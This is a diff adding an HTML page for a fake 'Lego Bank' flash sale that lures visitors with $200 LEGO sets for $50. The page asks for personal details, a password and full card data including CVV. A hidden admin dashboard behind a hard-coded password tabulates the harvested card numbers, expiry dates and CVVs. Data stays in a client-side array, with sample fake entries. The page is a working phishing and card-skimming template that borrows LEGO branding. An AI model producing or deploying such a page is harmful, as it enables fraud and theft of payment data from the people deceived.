@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lego Flash Sale | $200 Sets for $50!</title>
+    <style>
+        /* === Global Styles === */
+        :root {
+            --lego-red: #FF1100;
+            --lego-yellow: #FFD700;
+            --lego-blue: #0055BF;
+            --lego-green: #237841;
+            --lego-dark: #1A1A1A;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial Rounded MT Bold', 'Arial', sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            background-image: url('https://www.lego.com/cdn/cs/set/assets/blt6a0d4828c909d481/Classic-Background-Base.jpg');
+            background-size: cover;
+            background-attachment: fixed;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        /* === Utility Classes === */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        /* === Header Styles === */
+        header {
+            background-color: var(--lego-red);
+            color: white;
+            padding: 20px 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            position: relative;
+            z-index: 100;
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo img {
+            height: 50px;
+            width: auto;
+        }
+        
+        .logo h1 {
+            font-size: 28px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .tagline {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-top: 5px;
+        }
+        
+        .cart-btn {
+            background-color: var(--lego-yellow);
+            color: var(--lego-dark);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 4px 0 #D4AF37;
+            transition: all 0.2s;
+        }
+        
+        .cart-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 0 #D4AF37;
+        }
+        
+        .cart-btn:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #D4AF37;
+        }
+        
+        /* === Flash Sale Banner === */
+        .flash-banner {
+            background-color: var(--lego-yellow);
+            color: var(--lego-dark);
+            text-align: center;
+            padding: 15px;
+            font-weight: bold;
+            font-size: 18px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .flash-banner::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shine 2s infinite;
+        }
+        
+        @keyframes shine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        /* === Main Content === */
+        .hero {
+            background-color: white;
+            border-radius: 10px;
+            padding: 30px;
+            margin: 30px 0;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        
+        .hero h2 {
+            color: var(--lego-red);
+            font-size: 32px;
+            margin-bottom: 15px;
+        }
+        
+       .hero-img {
+    width: 50%;         /* Percentage of parent container */
+    max-width: 400px;   /* But never larger than 400px */
+    height: auto;
+
+        }
+        
+        .hero-img:hover {
+            transform: rotate(-5deg) scale(1.03);
+        }
+        
+        .price-tag {
+            background-color: var(--lego-green);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-size: 24px;
+            font-weight: bold;
+            margin: 15px 0;
+            display: inline-block;
+        }
+        
+        .original-price {
+            text-decoration: line-through;
+            opacity: 0.7;
+            margin-right: 10px;
+        }
+        
+        /* === Registration Form === */
+        #registration-form {
+            background-color: white;
+            border-radius: 10px;
+            padding: 30px;
+            margin: 30px 0;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: var(--lego-dark);
+        }
+        
+        .form-group input, 
+        .form-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group input:focus, 
+        .form-group select:focus {
+            border-color: var(--lego-blue);
+            outline: none;
+        }
+        
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .form-row .form-group {
+            flex: 1;
+        }
+        
+        /* === Card Preview === */
+        .card-preview {
+            background: linear-gradient(135deg, #c33764, #e9a93a);
+            border-radius: 15px;
+            padding: 20px;
+            color: white;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+            height: 180px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        
+        .card-preview::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
+        }
+        
+        .card-logo {
+            font-size: 18px;
+            font-weight: bold;
+            align-self: flex-end;
+        }
+        
+        .card-number {
+            font-size: 22px;
+            letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+            margin: 15px 0;
+        }
+        
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        /* === Submit Button === */
+        .submit-btn {
+            background-color: var(--lego-red);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            box-shadow: 0 4px 0 #CC0000;
+            margin-top: 20px;
+        }
+        
+        .submit-btn:hover {
+            background-color: #FF0000;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 0 #CC0000;
+        }
+        
+        .submit-btn:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #CC0000;
+        }
+        
+        /* === Admin Dashboard === */
+        #admin-dashboard {
+            background-color: white;
+            border-radius: 10px;
+            padding: 30px;
+            margin: 30px 0;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+        }
+        
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #eee;
+        }
+        
+        .admin-alert {
+            background-color: #FFEB3B;
+            color: #333;
+            padding: 10px 15px;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        th {
+            background-color: var(--lego-blue);
+            color: white;
+        }
+        
+        tr:nth-child(even) {
+            background-color: #f9f9f9;
+        }
+        
+        tr:hover {
+            background-color: #f1f1f1;
+        }
+        
+        .action-btn {
+            padding: 5px 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-right: 5px;
+        }
+        
+        .approve-btn {
+            background-color: #4CAF50;
+            color: white;
+        }
+        
+        .decline-btn {
+            background-color: #f44336;
+            color: white;
+        }
+        
+        /* === Tabs === */
+        .tabs {
+            display: flex;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #eee;
+        }
+        
+        .tab-btn {
+            padding: 10px 20px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            color: #666;
+            position: relative;
+        }
+        
+        .tab-btn.active {
+            color: var(--lego-blue);
+        }
+        
+        .tab-btn.active::after {
+            content: "";
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background-color: var(--lego-blue);
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        /* === Footer === */
+        footer {
+            text-align: center;
+            padding: 20px;
+            background-color: var(--lego-dark);
+            color: white;
+            margin-top: 50px;
+        }
+        
+        /* === Responsive Design === */
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .form-row {
+                flex-direction: column;
+                gap: 0;
+            }
+            
+            .hero h2 {
+                font-size: 24px;
+            }
+            
+            table {
+                display: block;
+                overflow-x: auto;
+            }
+        }
+        
+    </style>
+</head>
+<body>
+    <!-- Main Store Front -->
+    <div id="store-front">
+        <header>
+            <div class="container header-content">
+                <div class="logo">
+                    <img src="images/legobankheader.webp" alt="Lego Logo">
+                    <div>
+                        <h1>LEGO BANK</h1>
+                        <p class="tagline">Exclusive Members-Only Deals</p>
+                    </div>
+                </div>
+                <button class="cart-btn" onclick="showAdmin()">
+                    🔐 Admin Access
+                </button>
+            </div>
+        </header>
+
+        <div class="flash-banner">
+            🚨 FLASH SALE: $200+ LEGO SETS FOR JUST $50! • LIMITED TIME OFFER • ENDS SOON 🚨
+        </div>
+
+        <div class="container">
+            <div class="hero">
+                <h2>YOUR EXCLUSIVE LEGO DEAL AWAITS!</h2>
+                <p>Join Lego Bank today to access this limited-time offer</p>
+                <img src="images/falcon.jpg" alt="Millennium Falcon" class="hero-img">
+                <div class="price-tag">
+                    <span class="original-price">$199.99</span>
+                    <span>$49.99</span>
+                </div>
+                <p>This exclusive price is only available to Lego Bank members</p>
+            </div>
+
+            <form id="registration-form" onsubmit="registerUser(event)">
+                <h2 style="text-align: center; margin-bottom: 20px; color: var(--lego-blue);">Create Your Account</h2>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="first-name">First Name</label>
+                        <input type="text" id="first-name" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="last-name">Last Name</label>
+                        <input type="text" id="last-name" required>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="dob">Date of Birth</label>
+                    <input type="date" id="dob" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Create Password</label>
+                    <input type="password" id="password" required>
+                </div>
+                
+                <h3 style="margin: 25px 0 15px; color: var(--lego-blue);">Payment Information</h3>
+                <p style="margin-bottom: 15px; font-size: 14px;">Your card will be verified but not charged today</p>
+                
+                <div class="card-preview" id="card-preview">
+                    <div class="card-logo">LEGO BANK</div>
+                    <div class="card-number" id="preview-number">•••• •••• •••• ••••</div>
+                    <div class="card-details">
+                        <span id="preview-name">YOUR NAME</span>
+                        <span id="preview-expiry">MM/YY</span>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="card-name">Name on Card</label>
+                    <input type="text" id="card-name" required oninput="updateCardPreview()">
+                </div>
+                
+                <div class="form-group">
+                    <label for="card-number">Card Number</label>
+                    <input type="text" id="card-number" required maxlength="19" oninput="formatCardNumber()">
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="card-expiry">Expiration Date</label>
+                        <input type="text" id="card-expiry" placeholder="MM/YY" required maxlength="5" oninput="formatExpiry()">
+                    </div>
+                    <div class="form-group">
+                        <label for="card-cvv">CVV</label>
+                        <input type="text" id="card-cvv" required maxlength="4" oninput="updateCVV()">
+                    </div>
+                </div>
+                
+                <button type="submit" class="submit-btn">
+                    🔒 LOCK IN MY $50 LEGO SET
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Admin Dashboard (Hidden by Default) -->
+    <div id="admin-panel" class="hidden">
+        <header>
+            <div class="container header-content">
+                <div class="logo">
+                    <img src="https://www.lego.com/cdn/cs/set/assets/blt77d5254a0b39e721/logo-system.png" alt="Lego Logo">
+                    <div>
+                        <h1>LEGO BANK ADMIN</h1>
+                        <p class="tagline">Customer Data Dashboard</p>
+                    </div>
+                </div>
+                <button class="cart-btn" onclick="showStore()">
+                    🏪 Back to Store
+                </button>
+            </div>
+        </header>
+
+        <div class="container">
+            <div id="admin-dashboard">
+                <div class="admin-header">
+                    <h2>📊 Customer Registration Data</h2>
+                    <div class="admin-alert">
+                        🔐 Full card data visible - Secure admin environment
+                    </div>
+                </div>
+
+                <div class="tabs">
+                    <button class="tab-btn active" onclick="openTab('pending-tab')">Pending</button>
+                    <button class="tab-btn" onclick="openTab('approved-tab')">Approved</button>
+                    <button class="tab-btn" onclick="openTab('declined-tab')">Declined</button>
+                </div>
+
+                <div id="pending-tab" class="tab-content active">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Name</th>
+                                <th>Email</th>
+                                <th>DOB</th>
+                                <th>Card Number</th>
+                                <th>Expiry</th>
+                                <th>CVV</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="pending-orders">
+                            <!-- Filled by JavaScript -->
+                        </tbody>
+                    </table>
+                </div>
+
+                <div id="approved-tab" class="tab-content">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Name</th>
+                                <th>Email</th>
+                                <th>DOB</th>
+                                <th>Card Number</th>
+                                <th>Expiry</th>
+                                <th>CVV</th>
+                                <th>Status</th>
+                            </tr>
+                        </thead>
+                        <tbody id="approved-orders">
+                            <!-- Filled by JavaScript -->
+                        </tbody>
+                    </table>
+                </div>
+
+                <div id="declined-tab" class="tab-content">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Name</th>
+                                <th>Email</th>
+                                <th>DOB</th>
+                                <th>Card Number</th>
+                                <th>Expiry</th>
+                                <th>CVV</th>
+                                <th>Status</th>
+                            </tr>
+                        </thead>
+                        <tbody id="declined-orders">
+                            <!-- Filled by JavaScript -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>Lego Bank is not affiliated with The LEGO Group. Offers are limited time only.</p>
+            <p style="margin-top: 10px; font-size: 12px;">Lego bank the best place for great legos deals.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Database simulation
+        let users = [];
+        let adminPassword = "legobank$123";
+        
+        // DOM Elements
+        const storeFront = document.getElementById('store-front');
+        const adminPanel = document.getElementById('admin-panel');
+        
+        // Show admin panel
+        function showAdmin() {
+            const password = prompt("Enter admin password:");
+            if (password === adminPassword) {
+                storeFront.classList.add('hidden');
+                adminPanel.classList.remove('hidden');
+                renderAdminTables();
+            } else {
+                alert("Incorrect password");
+            }
+        }
+        
+        // Show store front
+        function showStore() {
+            storeFront.classList.remove('hidden');
+            adminPanel.classList.add('hidden');
+        }
+        
+        // Tab functionality
+        function openTab(tabId) {
+            // Hide all tab contents
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Deactivate all tab buttons
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            
+            // Activate selected tab
+            document.getElementById(tabId).classList.add('active');
+            event.currentTarget.classList.add('active');
+        }
+        
+        // Card preview updates
+        function updateCardPreview() {
+            const name = document.getElementById('card-name').value || 'YOUR NAME';
+            document.getElementById('preview-name').textContent = name;
+        }
+        
+        function formatCardNumber() {
+            const input = document.getElementById('card-number');
+            let value = input.value.replace(/\s/g, '');
+            
+            if (value.length > 0) {
+                value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
+            }
+            
+            input.value = value;
+            document.getElementById('preview-number').textContent = value || '•••• •••• •••• ••••';
+        }
+        
+        function formatExpiry() {
+            const input = document.getElementById('card-expiry');
+            let value = input.value.replace(/\D/g, '');
+            
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            
+            input.value = value;
+            document.getElementById('preview-expiry').textContent = value || 'MM/YY';
+        }
+        
+        function updateCVV() {
+            const cvv = document.getElementById('card-cvv').value;
+            // CVV isn't shown in preview for security
+        }
+        
+        // Form submission
+        function registerUser(event) {
+            event.preventDefault();
+            
+            // Get form values
+            const user = {
+                id: 'LB-' + Math.floor(1000 + Math.random() * 9000),
+                firstName: document.getElementById('first-name').value,
+                lastName: document.getElementById('last-name').value,
+                email: document.getElementById('email').value,
+                dob: document.getElementById('dob').value,
+                password: document.getElementById('password').value,
+                cardName: document.getElementById('card-name').value,
+                cardNumber: document.getElementById('card-number').value,
+                cardExpiry: document.getElementById('card-expiry').value,
+                cardCVV: document.getElementById('card-cvv').value,
+                status: 'pending',
+                date: new Date().toLocaleString()
+            };
+            
+            // Add to database
+            users.push(user);
+            
+            // Clear form
+            event.target.reset();
+            document.getElementById('preview-number').textContent = '•••• •••• •••• ••••';
+            document.getElementById('preview-name').textContent = 'YOUR NAME';
+            document.getElementById('preview-expiry').textContent = 'MM/YY';
+            
+            // Show success message
+            alert('Registration successful! Your Lego set is reserved pending admin approval.');
+        }
+        
+        // Render admin tables
+        function renderAdminTables() {
+            const pendingTable = document.getElementById('pending-orders');
+            const approvedTable = document.getElementById('approved-orders');
+            const declinedTable = document.getElementById('declined-orders');
+            
+            // Clear existing rows
+            pendingTable.innerHTML = '';
+            approvedTable.innerHTML = '';
+            declinedTable.innerHTML = '';
+            
+            // Add users to appropriate tables
+            users.forEach(user => {
+                const row = document.createElement('tr');
+                
+                row.innerHTML = `
+                    <td>${user.id}</td>
+                    <td>${user.firstName} ${user.lastName}</td>
+                    <td>${user.email}</td>
+                    <td>${user.dob}</td>
+                    <td>${user.cardNumber}</td>
+                    <td>${user.cardExpiry}</td>
+                    <td>${user.cardCVV}</td>
+                `;
+                
+                if (user.status === 'pending') {
+                    const actionCell = document.createElement('td');
+                    actionCell.innerHTML = `
+                        <button class="action-btn approve-btn" onclick="approveOrder('${user.id}')">Approve</button>
+                        <button class="action-btn decline-btn" onclick="declineOrder('${user.id}')">Decline</button>
+                    `;
+                    row.appendChild(actionCell);
+                    pendingTable.appendChild(row);
+                } else if (user.status === 'approved') {
+                    const statusCell = document.createElement('td');
+                    statusCell.textContent = 'Approved';
+                    statusCell.style.color = 'green';
+                    row.appendChild(statusCell);
+                    approvedTable.appendChild(row);
+                } else if (user.status === 'declined') {
+                    const statusCell = document.createElement('td');
+                    statusCell.textContent = 'Declined';
+                    statusCell.style.color = 'red';
+                    row.appendChild(statusCell);
+                    declinedTable.appendChild(row);
+                }
+            });
+        }
+        
+        // Admin actions
+        function approveOrder(userId) {
+            const user = users.find(u => u.id === userId);
+            if (user) {
+                user.status = 'approved';
+                renderAdminTables();
+                alert(`Order ${userId} approved!`);
+            }
+        }
+        
+        function declineOrder(userId) {
+            const user = users.find(u => u.id === userId);
+            if (user) {
+                user.status = 'declined';
+                renderAdminTables();
+                alert(`Order ${userId} declined!`);
+            }
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Add some sample data for demo purposes
+            users = [
+                {
+                    id: 'LB-1001',
+                    firstName: 'John',
+                    lastName: 'Doe',
+                    email: 'john@example.com',
+                    dob: '1985-05-15',
+                    password: '••••••',
+                    cardName: 'JOHN DOE',
+                    cardNumber: '4532 8765 3210 9876',
+                    cardExpiry: '05/25',
+                    cardCVV: '384',
+                    status: 'pending',
+                    date: '2023-06-15 14:30'
+                },
+                {
+                    id: 'LB-1002',
+                    firstName: 'Jane',
+                    lastName: 'Smith',
+                    email: 'jane@example.com',
+                    dob: '1990-11-22',
+                    password: '••••••',
+                    cardName: 'JANE SMITH',
+                    cardNumber: '5123 9876 4532 1098',
+                    cardExpiry: '08/26',
+                    cardCVV: '772',
+                    status: 'approved',
+                    date: '2023-06-14 09:15'
+                }
+            ];
+        });
+    </script>
+</body>
+</html>
